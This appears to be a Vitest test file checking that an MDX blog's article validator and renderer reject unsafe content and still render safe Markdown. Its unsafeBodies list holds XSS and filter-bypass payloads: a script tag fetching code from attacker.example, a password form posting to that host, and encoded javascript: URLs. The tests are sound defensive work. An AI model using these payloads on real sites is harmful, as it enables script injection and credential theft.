import { readFile, readdir } from 'node:fs/promises'
import { join } from 'node:path'
import matter from 'gray-matter'
import { renderToStaticMarkup } from 'react-dom/server'
import { compileMDX } from 'next-mdx-remote/rsc'
import { describe, expect, it } from 'vitest'
import { ArticleBody } from '@/components/article-body'
import { validateArticleBody } from './article-safety'

const unsafeBodies = [
  '<script src="https://attacker.example/payload.js" />',
  '<iframe src="https://attacker.example" />',
  '<svg><foreignObject>Content</foreignObject></svg>',
  '<form action="https://attacker.example"><input name="password" /></form>',
  '<a href="javascript:alert(1)">Click</a>',
  '<img src="x" onError="alert(1)" />',
  '<div dangerouslySetInnerHTML={{__html: "<script>bad</script>"}} />',
  '<p style={{backgroundImage: "url(https://attacker.example)"}}>Text</p>',
  '<CustomComponent />',
  'Text with <span title="ordinary">HTML</span>.',
  '{globalThis.process.exit(1)}',
  'Text {1 + 1}',
  'import Payload from "./payload.js"\n\n# Heading',
  'export const payload = "bad"\n\n# Heading',
  '<!-- HTML comment -->',
  '[Click](javascript:alert%281%29)',
  '[Click](JaVaScRiPt:alert%281%29)',
  '[Click](vbscript:msgbox%281%29)',
  '[Click](data:text/html,payload)',
  '[Click](//attacker.example/path)',
  '[Click](%2f%2fattacker.example/path)',
  '[Click](%252f%252fattacker.example/path)',
  '[Click](java%09script:alert%281%29)',
  '[Click](java&#x09;script:alert%281%29)',
  '[Click](javascript&#x3a;alert%281%29)',
  '[Click](java%250ascript:alert%281%29)',
  '[Click](https://example.com/%00payload)',
  '[Click](https://example.com/%da%09payload)',
  '[Click](https://example.com/%da%2509payload)',
  '[Click](https://example.com/%da%5cpayload)',
  '[Click](https://example.com/%ef%bb%bfpayload)',
  '[Click](https://example.com/%5cpath)',
  '[Click][payload]\n\n[payload]: javascript:alert%281%29',
  '[Click][PAY LOAD]\n\n[pay load]: java&#x09;script:alert%281%29',
  '![Picture](data:image/svg+xml,payload)',
  '![Picture](mailto:owner@example.com)',
  '![Picture][PAY LOAD]\n\n[pay load]: mailto:owner@example.com',
  '[unused]: javascript:alert%281%29',
]

describe('article safety', () => {
  it.each(unsafeBodies)('rejects executable MDX, HTML, and unsafe destinations: %s', (body) => {
    expect(() => validateArticleBody(body)).toThrow(/Article body/)
  })

  it('accepts ordinary Markdown, code, safe destinations, and case-insensitive references', () => {
    const body = [
      '# Heading',
      '## Subheading',
      '**Bold** and *emphasis* with `const value = {name: "<script>"}`.',
      '> A quoted paragraph.',
      '- First\n- Second',
      '1. First\n2. Second',
      'Hard break  \nNext line.',
      '---',
      '[Docs](https://example.com/docs?q=ok#part) and [HTTP](http://example.com).',
      '[Mail](mailto:owner@example.com) and [local](/posts/example).',
      '[Relative](../docs/page) [fragment](#part) [query](?page=2).',
      '[Spaces](/docs/with%20spaces) [Percent](/docs/100%25done).',
      '![Picture](/images/example.png) and ![Remote](https://example.com/image.png).',
      '[Reference][DOCS] and ![Picture][PICTURE LABEL]',
      '[docs]: https://example.com/docs\n[picture label]: /images/example.png',
      '```tsx\nimport Payload from "./payload"\n<script src="bad.js" />\n{globalThis.process.exit(1)}\n```',
    ].join('\n\n')
    expect(() => validateArticleBody(body)).not.toThrow()
  })

  it('accepts every existing local post including its coding examples', async () => {
    const directory = join(process.cwd(), 'content', 'posts')
    const files = (await readdir(directory)).filter((file) => file.endsWith('.mdx'))
    expect(files.length).toBeGreaterThan(0)
    for (const file of files) {
      const { content } = matter(await readFile(join(directory, file), 'utf8'))
      expect(() => validateArticleBody(content), file).not.toThrow()
    }
  })

  it('accepts literal percent paths without changing the rendered destination', async () => {
    const body = '[Docs](https://example.com/100%25data)'
    expect(() => validateArticleBody(body)).not.toThrow()
    const article = ArticleBody({ body })
    expect(article.props.source).toBe(body)
    const { content } = await compileMDX(article.props)
    expect(renderToStaticMarkup(content)).toContain('href="https://example.com/100%25data"')
  })
})

describe('ArticleBody rendering safety', () => {
  it.each(unsafeBodies)('refuses unsafe existing or edited content before compilation: %s', (body) => {
    expect(() => ArticleBody({ body })).toThrow(/Article body/)
  })

  it('preserves source bytes and renders safe Markdown through the actual MDX compiler', async () => {
    const body = '## Safe heading\n\n**Bold** and *emphasis*.\n\n[Docs](https://example.com)\n\n```html\n<script src="bad.js"></script>\n```\n'
    const article = ArticleBody({ body })
    expect(article.props.source).toBe(body)
    const { content } = await compileMDX(article.props)
    const html = renderToStaticMarkup(content)
    expect(html).toContain('Safe heading</h2>')
    expect(html).toContain('<strong>Bold</strong>')
    expect(html).toContain('<em>emphasis</em>')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).toContain('&lt;script src=&quot;bad.js&quot;&gt;&lt;/script&gt;')
    expect(html).not.toContain('<script')
  })
})
